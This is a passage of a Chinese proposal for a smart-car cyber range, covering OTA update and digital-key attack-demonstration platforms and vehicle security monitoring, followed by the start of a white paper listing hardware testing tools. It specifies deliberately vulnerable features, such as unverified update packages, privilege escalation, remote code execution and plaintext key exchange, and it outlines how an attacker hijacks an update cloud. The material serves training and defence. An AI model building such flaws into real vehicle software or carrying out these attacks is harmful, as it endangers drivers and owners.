实时监测车辆的活跃状态，以及分析车辆的ECU软件版本情况。此外，平台还能进行升级任务执行成功率的统计和分析。通过大数据分析功能，平台可以对海量的数据进行处理和挖掘，提取有价值的信息并进行可视化呈现。这样的分析结果可以帮助用户了解整个车辆群体的概况，洞察车辆的运行状态和软件版本分布情况，从而更好地制定升级策略和优化升级流程。同时，通过分析升级任务执行成功率，平台可以检测和诊断可能存在的问题，及时采取措施进行改进和修复。</li><li>平台支持多维度的用户管理，管理员可以创建不同类型的用户账号，并分配相应的角色和权限。用户可以根据其职责和需求被分配为不同的角色，如管理员、操作员、观察员等。每个角色都拥有特定的权限，以限制用户在平台上的操作范围。这样的多维度用户管理可以满足不同用户的需求，确保系统的安全性和可控性。平台支持批量或单独为用户配置权限，管理员可以根据具体情况，对用户进行权限的批量配置或单独配置。通过灵活的权限配置，可以确保不同用户在平台上只能执行其所需的操作，从而降低潜在的风险和错误操作。平台还记录用户的操作记录，无论是管理员还是普通用户，在平台上的操作都会被记录下来。管理员可以查看用户的操作记录，以便及时发现异常行为或错误操作，并做出相应的处理和纠正。这样的操作记录功能可以提高平台的安全性和可追溯性，为用户提供更好的管理和监控手段。</li><li>平台支持TLS（Transport Layer Security）协议，这是一种广泛应用于网络通信的安全协议。通过TLS协议，车辆端与后台之间的通信可以进行加密和身份验证，防止数据在传输过程中被窃取或篡改。平台实现了TLS双向认证。在双向认证中，不仅后台会对车辆端进行身份验证，车辆端也会对后台进行身份验证。这样双向的认证机制能够确保通信的双方都是合法的、可信任的实体，有效地防止中间人攻击和伪造身份的风险。在TLS双向认证通信过程中，车辆端和后台会交换数字证书，用于验证彼此的身份。数字证书由可信任的证书颁发机构（CA）签发，包含了实体的公钥和其他身份信息。通过验证对方的数字证书，车辆端和后台可以确认对方的身份，并建立起安全的通信连接。</li><li>支持OTA缺少升级包校验的功能，该功能可能会带来升级包被篡改的风险，从而导致车辆被刷入恶意升级包，造成安全隐患。</li><li>支持车机屏幕因恶意升级包被控制的功能，该功能可能会导致车机屏幕被远程攻击者控制，从而对车辆和乘客的安全构成威胁。</li><li>支持车辆与云平台正常升级数据与恶意升级包数据的光电效果显示的功能。通过这种功能，用户可以更加直观地了解车辆是否受到了恶意攻击，从而及时采取相应的安全措施。</li><li>OTA云平台存在提权漏洞的功能，并具备模拟攻击的功能。一旦发现提权漏洞，会模拟攻击者行为，尝试利用该漏洞进行提权。这一过程将演示如何利用漏洞获取OTA云平台的控制权，从而进一步控制与之相连的设备。</li><li>支持云平台被攻击者夺取控制，攻击者可以往车辆下发虚假的升级包，从而干扰车辆的正常运行，甚至导致车辆失控</li><li>支持模拟攻击生成大量的无用升级包，并模拟向车机推送的过程。通过这种方式，可以演示攻击者如何利用这一漏洞影响车机的正常使用，并让用户和开发者深入了解这种攻击的危害性。</li><li>支持攻击方与云平台攻击数据的光电效果显示。通过这一功能，用户可以直观地观察到攻击过程中数据的变化和交互。当攻击方发起攻击时，模块会实时显示攻击数据的光电效果，让用户能够清晰地了解攻击的进展和影响。</li></ol><p>数字钥匙平台，详见“智能汽车网络靶场演示模块”章节，“数字钥匙攻防演示模块”部分：</p><ol><li>平台支持用户对车辆进行管理，包括添加新车辆、删除已有车辆、编辑车辆信息等操作。用户可以根据车辆的不同属性进行分类管理，方便快速查找和处理。在平台上，用户可以定义和管理不同的车型。用户可以创建新的车型并设置相应的参数，如车型名称、车辆特性、ECU配置等。这样可以更精确地对车辆进行管理，并为不同车型分配相应的钥匙信息。用户可以将特定的车辆与特定的车型进行绑定。这样，当特定车辆上线时，系统会自动识别在平台上，用户可以将车型与相应的钥匙信息进行关联。通过这种关联，系统可以在车辆使用数字钥匙进行身份验证时，根据车辆所属的车型，自动匹配合适的钥匙信息。车辆所属的车型，并加载相应的钥匙信息和配置。用户可以在平台上获取特定车辆的ECU配置、固件版本、传感器状态等详细信息，以便进行故障排查和维护操作。</li><li>平台支持钥匙管理，包含钥匙状态，发放、吊销、冻结、分享钥匙。</li><li>平台支持多维度的用户管理，管理员可以创建不同类型的用户账号，并分配相应的角色和权限。用户可以根据其职责和需求被分配为不同的角色，如管理员、操作员、观察员等。每个角色都拥有特定的权限，以限制用户在平台上的操作范围。这样的多维度用户管理可以满足不同用户的需求，确保系统的安全性和可控性。平台支持批量或单独为用户配置权限，管理员可以根据具体情况，对用户进行权限的批量配置或单独配置。通过灵活的权限配置，可以确保不同用户在平台上只能执行其所需的操作，从而降低潜在的风险和错误操作。平台还记录用户的操作记录，无论是管理员还是普通用户，在平台上的操作都会被记录下来。管理员可以查看用户的操作记录，以便及时发现异常行为或错误操作，并做出相应的处理和纠正。这样的操作记录功能可以提高平台的安全性和可追溯性，为用户提供更好的管理和监控手段。</li><li>数字钥匙APP应包含以下功能：</li><li>认证管理：该功能提供了基于不同数字钥匙协议的认证服务。通过该功能，用户可以进行身份认证，确保只有授权用户可以使用数字钥匙进行车辆访问和控制。</li><li>钥匙管理：该功能提供了基于不同数字钥匙协议的钥匙全生命周期管理服务。用户可以通过该功能分享、吊销、停用和恢复数字钥匙，确保只有授权用户可以访问特定车辆，并且可以有效地管理和控制数字钥匙的使用。</li><li>车辆控制：该功能实现了基于不同数字钥匙协议的遥控车门解锁和上锁（RKE）功能。用户可以通过手机或其他移动终端使用数字钥匙APP，远程控制车辆的车门状态，提供便捷的车辆访问方式。</li><li>状态同步：该功能基于不同数字钥匙协议，提供了查看车辆状态的移动终端功能。用户可以通过数字钥匙APP查看车辆的实时状态，如车辆位置、电池状态、里程数等，保持对车辆的实时了解。</li><li>定位计算：该功能提供了基于低功耗蓝牙（BLE）的高精度定位计算能力。通过与车辆上的BLE设备进行通信，用户可以通过数字钥匙APP获取车辆的准确位置信息，提供精确的车辆定位服务。</li><li>密码模块：该功能提供了数字钥匙方案所需的安全存储和密码算法支持，包括国密算法和国际通用密码算法。此外，该功能还提供了安全存储其他数字钥匙敏感信息的能力，确保用户的数字钥匙信息得到保护。</li><li>蓝牙连接管理：该功能提供了不同数字钥匙协议所需的蓝牙配对绑定和连接功能。同时，根据定位计算需求，对移动终端的蓝牙模块进行配置，以确保与车辆的可靠通信和连接。</li><li>支持数字钥匙车端与移动端之间的蓝牙明文通信，攻击者可以通过截获通信数据来获取钥匙信息。这种明文通信的方式在数字钥匙的安全防护上存在重大漏洞，容易导致钥匙信息泄露。</li><li>支持攻击方通过被泄露的钥匙信息完成车辆解锁的功能。当攻击者获取了数字钥匙的信息后，他们可以利用这些信息尝试解锁车辆。这种被泄露的钥匙信息不仅包括加密的密钥，还可能包括与车辆通信的相关参数和协议。</li><li>支持攻击方与车辆的攻击数据光电效果显示。通过这一功能，用户可以直观地观察到攻击过程中数据的变化和交互。当攻击方发起攻击时，模块会实时显示攻击数据的光电效果，让用户能够清晰地了解攻击的进展和影响。</li><li>支持数字钥匙云平台存在远程执行漏洞，攻击者可以利用这一漏洞对云平台进行攻击，远程执行恶意代码或命令。这可能导致车辆被非法控制、数据泄露或系统瘫痪等严重后果。</li><li>支持通过远程执行吊销用户钥匙的功能，导致车辆无法正常解锁。当攻击者利用远程执行漏洞获得对数字钥匙系统的控制权时，他们可以利用这一功能吊销用户的数字钥匙，使其无法正常解锁车辆。</li><li>支持攻击方与云平台攻击数据的光电效果显示。通过这一功能，用户可以直观地观察到攻击过程中数据的变化和交互。当攻击方发起攻击时，模块会实时显示攻击数据的光电效果，让用户能够清晰地了解攻击的进展和影响。</li></ol><p>车端态势感知平台功能实施方案如下：</p><ol><li>该车端态势感知平台支持与智能汽车网络靶场基础平台中的态势分析分系统进行集成与适配，实现数据的共享和交互，提升整体态势感知的能力和效率。</li><li>车端态势感知平台模块支持车辆注册功能，确保每辆车在进入网络时能够被识别和验证。这个过程应包括车辆的身份验证和授权，以确保只有合法的车辆能够接入网络。</li><li>设备注册功能是车端态势感知平台的核心组成部分，该功能应能够支持车载各种智能设备的注册过程，包括但不限于Tbox、控制单元等。设备注册应确保设备身份的真实性和合法性，为设备间的安全通信提供保障。</li><li>车辆端流量数据上传功能要求平台能够接收来自车辆的网络流量数据。这些数据对于分析车辆的通信行为，识别潜在的安全问题至关重要。上传的流量数据包括时间戳、数据包大小、通信双方等信息，以便进行详尽的安全分析。</li><li>对于车辆安全事件的上传功能，平台必须能够处理来自车辆的各类安全警报和事件通知。这些安全事件可能包括异常行为、潜在的入侵尝试或系统故障等。上传的安全事件当包含足够的详细信息，以便于进行准确的后续分析和响应。</li><li>车辆防火墙规则获取功能是确保车辆防火墙始终保持最新状态的关键。平台应支持车辆从中心化的管理系统中获取最新的防火墙规则，这些规则可能包括IP白名单、端口号限制等，以增强车辆网络的安全性。</li><li>车辆入侵检测规则获取功能要求平台能够定期为车辆提供最新的入侵检测规则。这些规则是基于当前的安全威胁情报，旨在帮助车辆系统识别和阻止潜在的入侵行为。</li><li>车辆基础配置获取功能涉及到车辆的安全操作参数，如流量上传时间间隔、规则获取时间间隔等。平台应能够支持车辆获取这些基础配置信息，以便车辆可以根据网络状况和安全需求，自动调整其安全策略和操作参数。</li><li>车辆安全态势总览和安全态势大屏展示功能要求平台能够将车辆的安全状态以图形化的形式展现。这包括车辆的实时安全状况、历史安全事件、安全警告等信息。通过直观的大屏展示，操作人员可以快速把握整个车队的安全态势，及时做出响应。</li></ol><h4 id="技术实现内容-10"><a href="#技术实现内容-10" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><ol><li>OTA远程升级平台</li></ol><p>为验证及测试OTA升级管理的安全性，需要为XXXX汽车网络靶场搭建一套OTA远程升级攻防演示平台，该平台具备OTA远程升级所需，可用于管理和执行远程设备升级的系统，该平台提供了一个集中化的管理界面，用于上传软件包、创建升级任务、监控升级过程和管理设备。</p><p>演示步骤：</p><p>1.首先在本地搭建OTA升级的管理平台和相关软件，负责存储软件包和管理升级过程，OTA管理平台提供管理界面，用于上传软件包、创建升级任务、监控升级进度等功能。</p><p>2.软件包管理：在OTA管理平台上，您需要准备要升级的软件包。这些软件包应该是经过打包和签名的固件或应用程序版本。</p><p>3.设备注册和身份验证：在OTA管理平台上，您需要为目标设备创建唯一的标识符，并设置设备的注册和身份验证机制。这将确保只有经过授权的设备才能接收和执行升级任务。</p><p>4.升级任务创建：使用OTA管理平台，您可以创建升级任务并指定目标设备。选择要升级的软件包版本，并设置升级计划和策略，如升级时间、优先级等。</p><p>5.升级过程监控：OTA管理平台将提供实时监控功能，用于跟踪升级任务的执行情况。您可以查看目标设备的在线状态、升级进度和日志信息。</p><p>6.远程升级执行：一旦升级任务创建并启动，OTA管理平台将向目标设备发送升级通知。目标设备接收到通知后，会下载并安装升级软件包。您可以在OTA管理平台上查看升级任务的执行情况和结果。</p><ul><li>产品参数介绍</li></ul><ol><li><p>平台支持零件管理功能，按照ECU类型分类管理，该平台实现了零件管理功能，能够根据电子控制单元(ECU)的不同类型进行分类和管理。</p></li><li><p>平台支持车辆、车型管理功能，车辆绑定车型，车型关联ECU信息。可以在平台查看每辆车的所有ECU详细软硬件信息，该平台提供车辆和车型管理功能，允许车辆与特定车型绑定，而车型则关联具体的ECU信息，使得可以在平台上查看每一辆车的所有ECU的详细软硬件信息。</p></li><li><p>平台支持ECU软件版本管理功能，确保每个软件包只能唯一关联到一个ECU，并且每个ECU维护一个唯一的软件版本号。</p></li><li><p>平台支持升级包管理功能。支持用户上传ECU组件软件（如MCU、MPU升级包和配置文件等），并对其进行打包、签名和加密处理，以生成ECU的最终安全升级文件。</p></li><li><p>平台支持差分功能，能够通过比较不同软件版本之间的差异来生成差分升级包，以减少最终升级文件的大小，优化升级过程的效率和速度。</p><p>平台支持升级策略管理。通过升级策略限定每次升级的范围（如：单辆车、小批量、所有车辆等）达到灰度升级的目的。</p></li><li><p>平台支持升级任务管理。包括升级任务创建、升级任务审核、升级任务取消、升级任务执行状态监控等功能。</p><p><strong>升级任务创建</strong>：用户可以在平台上创建新的升级任务，指定所需的ECU目标、相关车型、升级包文件以及升级计划。这些任务可以根据不同车辆的需求和软件版本的兼容性来定制。</p><p><strong>升级任务审核</strong>：为了保证升级任务的准确性和安全性，每个新建的升级任务在执行前需要经过审核流程。审核人员可以检查升级任务的各项参数，确保升级包与目标ECU的匹配性，以及升级时间和策略的合理性。</p><p><strong>升级任务取消</strong>：如果升级任务因为某些原因需要中止，用户可以在平台上取消已创建或已审核的升级任务。取消操作需要根据权限和规则来执行，以防止误操作或非授权取消。</p><p><strong>升级任务执行状态监控</strong>：在升级任务执行的过程中，平台提供实时监控功能，用户可以查看每个升级任务的执行状态、进度条、成功或失败的详细信息。如果在升级过程中遇到问题，监控系统可以帮助快速定位问题，及时采取措施。</p></li><li><p>平台支持日志管理功能。对车辆上传的升级日志信息进行存储、分析处理。</p><p><strong>日志信息存储</strong>：平台自动收集车辆在ECU升级过程中生成的所有日志信息，并将这些信息存储在数据库中。存储的日志包括时间戳、车辆标识、ECU标识、升级包版本、升级状态、错误代码等关键信息。</p><p><strong>日志信息分析</strong>：平台可能提供自动化工具来分析日志数据，识别常见问题和趋势，例如频繁的升级失败、特定ECU的问题或特定车型的升级性能问题。</p></li><li><p>平台支持大数据分析功能。能够对后台收集和产生的海量信息进行深入分析和直观呈现，包括统计车辆总数、监控车辆活跃状态、跟踪车辆ECU软件版本情况以及计算升级任务的执行成功率等关键指标。</p></li><li><p>平台支持多维度的用户、角色、权限管理。能够批量或者单独为用户配置权限，且可以查看用户的操作记录。</p></li><li><p>平台支持TLS双向认证。车辆端与后台之间采用TLS双向认证通信，保证通信数据传输安全，该平台提供了多维度的用户、角色和权限管理功能，允许管理员批量或单独配置用户权限，并能够追踪和查看用户的具体操作记录以确保系统的安全和可审计性。</p></li><li><p>支持OTA缺少升级包校验，升级包篡改导致车辆被刷入恶意升级包；在支持OTA（Over-The-Air）升级的车辆管理平台中，若缺少严格的升级包校验机制，存在安全风险。具体来说，升级过程中系统未能有效验证升级包的完整性和来源的真实性。在这种情况下，如果升级包在传输过程中被截取并篡改，或者在服务器端被恶意替换，平台可能无法识别这种篡改行为，导致恶意代码或软件被上传并部署到车辆的电子控制单元（ECU）中。</p></li><li><p>支持车机屏幕因恶意升级包被控制，如果车辆管理平台的OTA升级功能缺少严格的升级包校验机制，那么车机系统（Infotainment System）就可能面临被恶意升级包控制的风险；</p></li><li><p>支持车辆与云平台正常升级数据与恶意升级包数据的光电效果显示，车辆与云平台之间正常升级数据与恶意升级包数据的光电效果时，想象一个用户界面（UI）或者仪表盘上的显示效果，这些效果通常是为了向驾驶员提供视觉反馈。</p></li><li><p>支持OTA云平台存在提权漏洞攻击者利用系统或应用程序中的安全漏洞，从而获得比其当前权限更高级别的访问权。在OTA（Over-The-Air）云平台的背景下，提权漏洞可能允许攻击者执行通常只有系统管理员或有更高权限用户才能进行的操作。</p></li><li><p>支持云平台被夺取后往车辆下发无用升级包；</p><p><strong>入侵</strong>：攻击者可能通过利用已知的安全漏洞、社会工程学、钓鱼攻击或内部人员协助等手段入侵云平台。</p><p><strong>提权</strong>：一旦入侵系统，攻击者通常会寻找提升权限的方法，以便获得管理员级别的访问权限。</p><p><strong>控制OTA更新机制</strong>：攻击者获取了足够的权限后，便可以控制OTA（Over-The-Air）更新机制，包括构建和批准升级包、安排升级时间表等。</p><p><strong>制作无用或恶意升级包</strong>：攻击者可以创建无用的升级包，这些包可能不包含任何实际的更新内容，或者故意构建包含恶意软件的升级包。</p><p><strong>下发升级包</strong>：攻击者可以利用云平台的更新机制，将这些无用或恶意升级包分发到与云平台连接的车辆上。</p></li><li><p>支持大量无用升级包导致车机频繁弹出升级信息无法正常使用，大量无用升级包导致车机系统频繁提示更新，干扰了正常使用并降低了用户体验；</p></li><li><p>支持攻击方与云平台攻击数据光电效果显示。</p></li></ol><p>（OTA在线升级管理平台-零部件管理）</p><ol><li>数字钥匙平台方案</li></ol><p>为演示车辆数字钥匙的安全性，本方案搭建一个专门用于测试的环境。下面是搭建测试环境的一般步骤：</p><p>1. 选择测试车辆：选择一辆用于测试的车辆。可以是一辆实际的车辆或者是一个模拟器。</p><p>2. 搭建车辆通信网络：搭建一个用于车辆通信的网络环境，以模拟车辆与数字钥匙之间的通信。这可以是一个局域网或者是一个专门的测试网络。</p><p>3. 安装数字钥匙系统：根据您要测试的数字钥匙系统的要求，在测试车辆上安装相应的数字钥匙系统。确保数字钥匙系统与车辆的通信正常，并能够进行密钥交换和身份验证。</p><p>4. 创建测试数字钥匙：在测试环境中创建测试用的数字钥匙。为每个测试数字钥匙分配唯一的标识符，并设置相应的密钥和身份验证信息。</p><p>5. 进行安全性测试：根据您的安全测试计划，对数字钥匙系统进行安全性测试。这可以包括身份验证绕过、密钥破解、通信窃听等方面的测试。确保测试过程中的数据和通信都受到适当的保护。</p><p>6. 分析测试结果：分析安全性测试的结果，评估数字钥匙系统的安全性。识别潜在的安全漏洞和风险，并提出改进建议。</p><p>（数字钥匙车辆管理界面）</p><ol><li>车端态势感知平台</li></ol><p>车端态势感知平台是指对网络和信息系统的当前状态和威胁进行实时监测、分析和评估的过程。它旨在帮助安全团队了解整个网络环境中的威胁情况，及时发现和应对潜在的安全事件。态势感知平台包含以下几个方面：</p><p>实时监测：车端态势感知平台通过实时监测网络和信息系统的活动，收集、分析和记录大量的安全事件数据。它可以监测网络流量、系统日志、入侵检测系统警报等，以获取关于网络活动和潜在威胁的信息。</p><p>异常检测：车端态势感知平台通过使用机器学习和行为分析技术，检测网络和系统中的异常活动。它可以识别不寻常的登录行为、异常的数据传输、未经授权的访问等，以帮助发现潜在的安全威胁和入侵行为。</p><p>报告和可视化：车端态势感知平台会生成详细的报告和可视化图表，向安全团队和管理层提供关于网络安全态势的实时和历史数据。这些报告和图表可以帮助团队了解威胁的趋势、攻击的来源和目标，以及采取的防御措施的有效性。</p><p>态势感知平台将支持以下能力：</p><p>集成与适配：平台设计支持与智能汽车网络靶场基础平台中态势分析分系统的集成与适配，能够快速接入现有系统，实现数据共享和功能协同。</p><p>车辆注册：支持车辆注册功能，为每一辆车分配唯一的身份标识，确保车辆信息的准确性和安全性。通过身份认证，车辆可以被准确识别并加入态势感知的监控范围。</p><p>设备注册：支持车载设备注册，包括各种传感器、控制单元等，确保所有设备能够被平台识别和管理，为数据采集和事件响应提供基础。</p><p>车辆端流量数据上传：支持车辆端流量数据的实时上传，包括车辆的运行状态、环境信息、用户行为等多维度数据，为态势分析提供丰富的数据源。</p><p>车辆安全事件上传：支持车辆安全事件的实时上传，当车辆检测到异常行为或潜在威胁时，能够及时上报，确保事件得到快速响应和处理。</p><p>车辆防火墙规则获取：支持车辆防火墙规则的获取，平台能够定期下发最新的防火墙规则到车辆，确保车辆的网络环境在最新的安全防护之下。</p><p>车辆入侵检测规则获取：支持车辆入侵检测规则的获取，平台将根据最新的安全威胁情报更新入侵检测规则，并推送至车辆，提高车辆抵御未知威胁的能力。</p><p>车辆基础配置获取：支持车辆基础配置的获取，包括流量上传时间间隔、规则获取时间间隔等，平台能够根据网络状态和安全需求动态调整配置参数，优化车辆的安全性能。</p><p>车辆安全态势总览与大屏展示：支持车辆安全态势总览，通过数据分析和可视化技术，实现安全态势的大屏展示，为管理人员提供直观的安全监控界面，帮助快速理解当前的安全状况，并作出决策。</p><p>通过以上这些态势分析功能和能力，可以帮助安全团队实时了解网络和信息系统的安全状况，及时发现和应对潜在的安全威胁，提高整体的安全性和防护能力。</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>应急响应中心白皮书</title>
      <link href="posts/47238be2/"/>
      <url>posts/47238be2/</url>
      
        <content type="html"><![CDATA[<p><strong>应急响应中心白皮书</strong></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f0f87ae178beabba34ab47812799c4cb.png"></p><p>浙江国利网安科技有限公司</p><p>目 录</p><p>1 智能汽车网络靶场工具库-硬件工具 1</p><p>1.1 技术实现内容 1</p><p>1.1.1 硬件安全测试工具集 1</p><p>1.1.2 USB测试工具集 31</p><p>1.1.3 车载以太网转换工具 37</p><p>2 智能汽车网络靶场汽车应急响应中心 42</p><p>2.1 总体概述 42</p><p>2.2 系统概述 42</p><p>2.3 系统组成 43</p><p>2.4 应急响应中心总体框架 43</p><p>2.4.1 漏洞平台 43</p><p>2.4.2 威胁情报平台 44</p><p>2.4.3 检测平台 44</p><p>2.4.4 安全运营平台 44</p><p>2.4.5 众测活动方案 44</p><p>3 智能汽车网络靶场漏洞管理平台 46</p><p>3.1 测试目标 46</p><p>3.2 测试技术路线 47</p><p>3.2.1 漏洞管理平台 47</p><p>3.2.2 漏洞提交平台（SRC） 80</p><p>3.3 测试背景 113</p><p>4 智能汽车网络靶场威胁情报平台 115</p><p>4.1 技术路线 115</p><p>4.1.1 功能实施方案 115</p><p>4.1.2 失陷检测情报 117</p><p>4.1.3 文件信誉情报 119</p><p>4.1.4 IP信誉情报 121</p><p>4.1.5 漏洞情报 122</p><p>4.1.6 APT档案库 124</p><p>4.1.7 数据更新 125</p><p>5 智能汽车网络靶场检测平台 127</p><p>5.1 技术路线 127</p><p>5.1.1 技术架构描述 127</p><p>5.1.2 功能描述 130</p><p>5.1.3 测试能力 145</p><p>5.1.4 测试场景 149</p><p>5.1.5 平台支持 183</p><p>6 智能汽车网络靶场安全运营平台 184</p><p>6.1 技术路线 184</p><p>6.1.1 总体技术要求 184</p><p>6.1.2 安全运营体系建设 186</p><h1 id="智能汽车网络靶场工具库-硬件工具"><a href="#智能汽车网络靶场工具库-硬件工具" class="headerlink" title="智能汽车网络靶场工具库-硬件工具"></a>智能汽车网络靶场工具库-硬件工具</h1><h2 id="技术实现内容"><a href="#技术实现内容" class="headerlink" title="技术实现内容"></a>技术实现内容</h2><h3 id="硬件安全测试工具集"><a href="#硬件安全测试工具集" class="headerlink" title="硬件安全测试工具集"></a>硬件安全测试工具集</h3><p>对零部件硬件安全合规检测，如JTAG、USB、UART、SPI等接口，可针对固件提取、固件调试、硬件拆焊、线路焊接、PCB板电路检查等测试提供必要的基础操作工具及耗材。</p><h4 id="功能实施方案"><a href="#功能实施方案" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li><p>焊烟净化器，数量2台：额定电压220V50Hz，功率80w，系统流量200m³/h，滤芯层数3层，提供3套替换芯。</p><p>提供2台焊烟净化器，焊烟净化器是专门设计来净化焊接过程中产生的烟尘的设备，这款焊烟净化器配备了额定电压为220V且频率为50Hz的电源系统，功率仅为80W，节能且高效。它的系统流量达到了200立方米每小时，能够覆盖较大的工作区域，确保焊接时产生的烟尘被迅速且有效地吸走和过滤。净化器内部采用的是三层滤芯设计，这意味着它可以通过多级过滤来捕捉和隔离焊烟中的有害颗粒和气体，从而提供更清洁的工作环境。此外，该设备还提供3套替换芯，方便用户根据使用情况及时更换滤芯，保持净化效率，延长设备的使用寿命。这种设计不仅有助于保护操作工人的健康，也有利于符合工作场所的安全规范。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d313fbcc4bfe7051be47106ae56d0708.png"></p><ol><li><p>ECU探针，数量4套：适用于KESS V2, KTAG, KTM100, BDM100, 22pcs BDM 适配器。</p><p>提供4套ECU探针，这些探针兼容多种主流的ECU编程和调试工具，包括KESS V2, KTAG, KTM100, BDM100等。此外，还提供了22pcs的BDM适配器，以确保这些探针能够与各种不同的ECU接口兼容，从而为汽车技术人员提供了极大的灵活性。这些ECU探针套件的配置，让工作人员能够在进行汽车电子单元的检测、故障诊断、数据调整以及固件升级时，实现更为高效和精准的操作，大大提升了工作效率和服务质量。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/043286ad3f7c46ec9a0955c222e38119.png"></p><ol><li><p>Jtagulator，数量5套：支持的目标接口：JTAG/IEEE 1149.1，ARM SWD，UART/异步串行；可以直接连接 SigRok 和 OpenODC 使用；带输入保护电路的24个 I/O 通道；电平转换的可调目标电压：1.2V ~ 3.3V；USB 接口，用于连接电脑进行控制；尺寸：57.2mm x 152.5mm x 16mm。</p><p>提供5套Jtagulator设备，以满足高级电子工程师在进行硬件调试和逆向工程时的需求。每套Jtagulator都支持多种目标接口，包括标准的JTAG/IEEE 1149.1，ARM SWD以及UART/异步串行，这提供了对各种微控制器和处理器的广泛兼容性。它们还能够与开源软件SigRok和OpenODC直接连接使用，为工程师们提供了更大的灵活性和便捷性。这些Jtagulator设备拥有24个带输入保护电路的I/O通道，极大地增强了设备的耐用性和对电路的保护。电平转换功能支持可调目标电压范围从1.2V到3.3V，使其能够适应各种不同的逻辑电平要求。通过USB接口连接电脑，用户可以轻松控制Jtagulator进行各项操作。尺寸方面，每个Jtagulator的体积为57.2mm x 152.5mm x 16mm，这样的尺寸设计既便于携带，又足够容纳所有必要的功能，非常适合需要在不同环境下进行工作的工程师。这些Jtagulator的引入，无疑将极大提升硬件调试和开发的效率和安全性。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/45c944a1e5950e550f81c7196399e1b0.png"></p><ol><li>EMMC植锡工具，数量3套：最大支持90mm*90mm BGA。</li></ol><p>提供3套EMMC植锡工具，提升在电子组件植锡方面的能力。这些工具的设计考虑到了用户操作的便捷性和精确性，最大支持90mm*90mm的BGA封装类型，这覆盖了市面上大部分的EMMC芯片。使用这些植锡工具，技术人员能够精确地为EMMC芯片上的微小焊球进行植锡，确保在后续的焊接过程中能够获得良好的连接质量。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/09edd6dd19ef3911bb9f9264da8c5a7d.png"></p><ol><li><p>杜邦线，数量50套：母对母 线长30cm。</p><p>提供50套杜邦线，这些线材的设计是母对母接口，线长达到30cm，提供了足够的灵活性以满足各种电路连接需求。这些杜邦线是实验室和电子中不可或缺的组件，它们能够方便地用于原型设计、测试板连接以及任何需要可靠跳线的场合。母对母的接口类型使得这些杜邦线能够轻松地连接到各种引脚或接口上，而30cm的长度则为不同设备间的连接提供了充足的距离，增加了布局的灵活性。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f62a9795e400e492705ce2359905e13e.png"></p><ol><li><p>剥线钳，数量5套：剥线直径1.25mm~8mm 可调式。</p><p>为了满足精确剥线的需求，提供5套剥线钳。这些剥线钳能够处理1.25mm到8mm直径范围内的电线，且剥线尺寸是可调式的，使得它们非常适合不同大小电线的剥线作业。这种可调节功能为工作人员提供了极高的灵活性，无论是细小的电子线路还是较粗的电缆，都能够准确且轻松地剥去外层绝缘，保障连接的准确性和安全性。这些剥线钳是电工和电子工程师工具箱中不可缺少的工具。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/38c7e760fcf2b6ac39379ffc7de6fa9a.png"></p><ol><li><p>UART工具，数量10套：USB转1.8/2.8/3.3/5V TTL。</p><p>提供10套UART工具，以便于实现USB转TTL的通信需求。这些工具支持多种电压级别，包括1.8V、2.8V、3.3V以及5V TTL，这样的设计使得它们能够与多种不同的电子设备兼容，提供灵活的连接选项。无论是用于调试还是为微控制器提供串行通信，这些UART工具都是实现USB到TTL转换的理想选择，确保了数据传输的可靠性和多样性。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9a4d3e2041cd352919d5efe9af404b7f.png"></p><ol><li><p>EMMC底座，数量5套：支持BGA152/BGA169封装。</p><p>提供5套EMMC底座。这些底座专为支持BGA152和BGA169封装的EMMC芯片设计，使它们能够轻松地安装并与相关硬件接口。这种底座的设计考虑到了现代电子制造中对于快速、可靠连接的需求，进而确保了在处理数据存储组件时的高效率和精确性。这些EMMC底座对于在进行芯片编程、测试或数据恢复时都将是不可或缺的工具。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f532f580307bbc4efc02807ab30712c9.png"></p><ol><li><p>螺丝刀，数量5套：螺丝刀套装 57合1。</p><p>提供5套新的螺丝刀套装，每套为57合1型号，以满足工作中对多功能精密螺丝刀的需求。这些套装包含了各种尺寸和形状的螺丝刀头，适用于各种精细的装配和维修工作。无论是电子设备的拆卸、组装还是日常的维护任务，这些螺丝刀套装都能提供极大的便利和效率，是工具箱中不可或缺的一部分。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1cfe17e34ed9752c5fd0f8b5703d8ff3.png"></p></li><li><p>电动螺丝刀，数量2个，12V供电，空转1-1500/分钟，扭矩30/13NM，木材钻孔20MM，金属钻孔10MM，电源方式为直流电。</p><p>提供2个电动螺丝刀。这些螺丝刀以12V直流电为供电方式，具备强大的性能，空转速度可调节在1至1500转/分钟，能够满足不同工作强度的需求。它们配备了高低两档扭矩设置，分别为30NM和13NM，以适应不同的紧固任务。此外，这些电动螺丝刀在木材上的钻孔能力达到20MM，在金属上的钻孔能力为10MM，强劲的动力和多功能性使其成为工具箱中的重要组成部分。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" 